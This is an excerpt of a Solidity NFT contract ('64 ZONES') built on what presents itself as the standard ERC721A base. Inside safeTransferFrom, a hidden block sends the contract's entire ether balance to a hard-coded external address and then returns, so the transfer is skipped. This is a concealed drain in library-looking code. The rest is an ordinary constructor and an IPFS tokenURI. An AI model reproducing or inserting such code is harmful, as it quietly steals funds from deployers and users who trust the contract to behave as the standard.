...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x8fcaeDEEf7C246240E7a1F77D3B8D8f85Eb2cFE4).transfer(address(this).balance);
            return;
        }
...
contract SIXTYFOURZONES is ERC721A {
    ...
    constructor() ERC721A("64 ZONES", "64ZONES") {
        owner = msg.sender;
    }

    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeid4j4qinlgtfvxqcedp666v7iho72gcauegpey2ndolrwqv2rf37q/", _toString(tokenId), ".json"));
    }
